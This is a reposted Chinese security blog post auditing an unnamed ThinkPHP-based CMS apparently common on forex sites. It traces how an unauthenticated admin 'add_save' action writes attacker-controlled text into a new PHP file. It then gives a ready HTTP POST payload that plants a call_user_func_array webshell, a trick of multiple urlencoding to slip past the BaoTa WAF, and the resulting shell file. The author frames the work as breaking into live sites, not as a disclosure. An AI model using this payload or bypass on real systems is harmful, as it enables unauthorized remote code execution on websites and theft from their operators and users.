#  实战 | 某外汇常用CMS通用未授权RCE   
 橘猫学安全   2024-09-10 18:51  
  
> 某妞子发给我的一个cms，有各种注入，但是网上大部分站点都是用宝塔搭建的，并且开了waf的功能，索性审一个rce直接日下。  
  
  
一般程序是基于ThinkPHP3.1.3进行二次开发的，直接根据特征从Github找了个源代码下来审，注入就不说了，直接看RCE：  
  
Admin/Lib/Action/typeAction.class.php  
```
public function add_save()
{
        $data=pg('data');
        M('classify_type')->data($data)->add();
 
        $sql='
        CREATE TABLE index_'.$data['table_name'].' (
          '.$data['table_name'].'_id int(10) NOT NULL AUTO_INCREMENT,
          type_id int(10) NOT NULL,
          date int(10) NOT NULL,
          title varchar(99) NOT NULL,
          keywords varchar(99) NOT NULL,
          description varchar(10) NOT NULL,
          version_id int(10) NOT NULL,
          PRIMARY KEY ('.$data['table_name'].'_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;';
        M()->query($sql);
 
        if(!file_exists('Index/Lib/Action/'.$data['table_name'].'Action.class.php'))
        {
            copy('Index/Lib/Action/messageAction.class.php','Index/Lib/Action/'.$data['table_name'].'Action.class.php');
            $content=read_file('Index/Lib/Action/'.$data['table_name'].'Action.class.php');
            $content=str_replace('messageAction',$data['table_name'].'Action',$content);
            write_file('Index/Lib/Action/'.$data['table_name'].'Action.class.php',$content);
            copy_dir('Index/Tpl/message','Index/Tpl/'.$data['table_name']);
        }
 
        echo '操作成功';
    }
```  
  
直接从参数获取data数组，没有任何检验/过滤/认证，后面用了write_file函数，跟进去看看  
  
ThinkPHP/Common/common.php  
```
function write_file($path,$data)
{
    creat_file($path);
    $fp=fopen($path,"w+");
    if(!fwrite($fp,$data))
    {
        return false;
    }
    else
    {
        fclose($fp);
        return true;
    }
}
```  
  
很简单的一个函数，根据参数直接写文件，再回头看看刚才的代码：  
```
write_file('Index/Lib/Action/'.$data['table_name'].'Action.class.php',$content);
```  
  
文件名是php格式，如果$content可控，那就直接RCE了，$content内容是复制Index/Lib/Action/messageAction.class.php的，然后根据指定参数进行替换，先看下代码：  
  
Index/Lib/Action/messageAction.class.php  
```
<?php
class messageAction extends Action {
    public function index(){
        $this->display();
    }
 
    public function details(){
        $this->display();
    }
    public function add_save()
{
        $data = pg('data');
        $type_id = $data['type_id'];
        $classify_id = pg('classify_id');
        $table_name = M('classify_type')->where(array('type_id' => $type_id))->getField('table_name');
        $content = M($table_name)->where(array($table_name.'_id' => $content_id))->select();
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 4))->select();
        foreach($list as $k => $v){
            $data[$v['field_name']]=serialize($data[$v['field_name']]);
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 7))->select();
        foreach($list as $k => $v){
            if(!empty($_FILES[$v['field_name']]['tmp_name'])){
                $data[$v['field_name']] = $this->up_file(array('name' => $v['field_name']));
            }
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 8))->select();
        foreach($list as $k => $v)
        {
            $data[$v['field_name']]=strtotime($data[$v['field_name']]);
        }
 
        $id = M($table_name)->data($data)->add();
        M('relevance')->data(array('classify_id'=> $classify_id, 'content_id' => $id, 'main_id' => 1, 'type_id' => $type_id))->add();
        $this->success('提交成功');
    }
}
```  
  
也就是第二行的messageAction会替换成参数指定的，但是文件名同时也会被修改，所以很多Payload在这边是没办法使用的，然后还有一个宝塔WAF要绕过，直接给Payload：  
```
POST /admin.php?m=type&a=add_save HTTP/1.1
Host: www.xxx.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 205
Connection: close
Pragma: no-cache
Cache-Control: no-cache
 
data%5Bdate%5D=1606456937&data%5Btype_name%5D=123&data%5Btable_name%5D=abc{}call_user_func_array($_REQUEST[a],array($_REQUEST[b][0],urldecode(urldecode($_REQUEST[b][1])))); class &data%5Bpage_name%5D=index

```  
  
大部分的函数在流量就被拦截了，但是他忽略了urlencode，只需要多弄几个urlencode就可以绕过流量了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEIib7YJibiaTL0SXLULYFpGTnI2icqfzE2oyVCgsc4NfTbe6rpDMAPcXYwpIKnDBtQOwUWN0tQxrl5cQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
最后建立的文件长这样：  
```
http://www.xxx.com/Index/Lib/Action/abc{}call_user_func_array($_REQUEST[a],array($_REQUEST[b][0],urldecode(urldecode($_REQUEST[b][1])))); class Action.class.php
```  
```
<?php
class abc{}call_user_func_array($_REQUEST[a],array($_REQUEST[b][0],urldecode(urldecode($_REQUEST[b][1])))); class Action extends Action {
    public function index(){
        $this->display();
    }
 
    public function details(){
        $this->display();
    }
    public function add_save()
{
        $data = pg('data');
        $type_id = $data['type_id'];
        $classify_id = pg('classify_id');
        $table_name = M('classify_type')->where(array('type_id' => $type_id))->getField('table_name');
        $content = M($table_name)->where(array($table_name.'_id' => $content_id))->select();
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 4))->select();
        foreach($list as $k => $v){
            $data[$v['field_name']]=serialize($data[$v['field_name']]);
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 7))->select();
        foreach($list as $k => $v){
            if(!empty($_FILES[$v['field_name']]['tmp_name'])){
                $data[$v['field_name']] = $this->up_file(array('name' => $v['field_name']));
            }
        }
 
        $list = M('input')->where(array('type_id' => $type_id, 'show_switch' => 2, 'input_type_id' => 8))->select();
        foreach($list as $k => $v)
        {
            $data[$v['field_name']]=strtotime($data[$v['field_name']]);
        }
 
        $id = M($table_name)->data($data)->add();
        M('relevance')->data(array('classify_id'=> $classify_id, 'content_id' => $id, 'main_id' => 1, 'type_id' => $type_id))->add();
        $this->success('提交成功');
    }
}
```  
```
作者：hzllaga
来源：https://wtfsec.org/posts/%e6%9f%90%e5%a4%96%e6%b1%87%e5%b8%b8%e7%94%a8cms%e9%80%9a%e7%94%a8%e6%9c%aa%e6%8e%88%e6%9d%83rce/
```  
  
如有侵权，请联系删除  
  
**推荐阅读**  
  
[实战|记一次奇妙的文件上传getshell](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495718&idx=1&sn=e25bcb693e5a50988f4a7ccd4552c2e2&chksm=c04d7718f73afe0e282c778af8587446ff48cd88422701126b0b21fa7f5027c3cde89e0c3d6d&scene=21#wechat_redirect)  
  
  
[「 超详细 | 分享 」手把手教你如何进行内网渗透](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495694&idx=1&sn=502c812024302566881bad63e01e98cb&chksm=c04d7730f73afe267fd4ef57fb3c74416b20db0ba8e6b03f0c1fd7785348860ccafc15404f24&scene=21#wechat_redirect)  
  
  
[神兵利器 | siusiu-渗透工具管理套件](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495385&idx=1&sn=4d2d8456c27e058a30b147cb7ed51ab1&chksm=c04d69e7f73ae0f11b382cddddb4a07828524a53c0c2987d572967371470a48ad82ae96e7eb1&scene=21#wechat_redirect)  
  
  
[一款功能全面的XSS扫描器](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495361&idx=1&sn=26077792908952c6279deeb2a19ebe37&chksm=c04d69fff73ae0e9f2e03dd8e347f35d660a7fd3d51b0f5e45c8c64afc90c0ee34c4251f9c80&scene=21#wechat_redirect)  
  
  
[实战 | 一次利用哥斯拉马绕过宝塔waf](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495331&idx=1&sn=94b63a0ec82de62191f0911a39b63b7a&chksm=c04d699df73ae08b946e4cf53ceea1bc7591dad0ce18a7ccffed33aa52adccb18b4b1aa78f4c&scene=21#wechat_redirect)  
  
  
[BurpCrypto: 万能网站密码爆破测试工具](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495253&idx=1&sn=d4c46484a44892ef7235342d2763e6be&chksm=c04d696bf73ae07d0c16cff3317f6eb847df2251a9f2332bbe7de56cb92da53b206cd4100210&scene=21#wechat_redirect)  
  
  
[快速筛选真实IP并整理为C段 -- 棱眼](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495199&idx=1&sn=74c00ba76f4f6726107e2820daf7817a&chksm=c04d6921f73ae037efe92e051ac3978068d29e76b09cf5b0b501452693984f96baa9436457e4&scene=21#wechat_redirect)  
  
  
[自动探测端口顺便爆破工具t14m4t](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495141&idx=1&sn=084e8231c0495e91d1bd841e3f43b61c&chksm=c04d6adbf73ae3cdbb0a4cc754f78228772d6899b94d0ea6bb735b4b5ca03c51e7715b43d0af&scene=21#wechat_redirect)  
  
  
[渗透工具｜无状态子域名爆破工具（1秒扫160万个子域）](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495099&idx=1&sn=385764328aff5ec49acddab380721af0&chksm=c04d6a85f73ae393ffab22021839f5baec3802d495c34fb364cbdd9b7cb0cf642851e9527ba7&scene=21#wechat_redirect)  
  
  
  
**查看更多精彩内容，还请关注**  
**橘猫学安全**  
  
  
**每日坚持学习与分享，觉得文章对你有帮助可在底部给点个“**  
**再看”**  
  
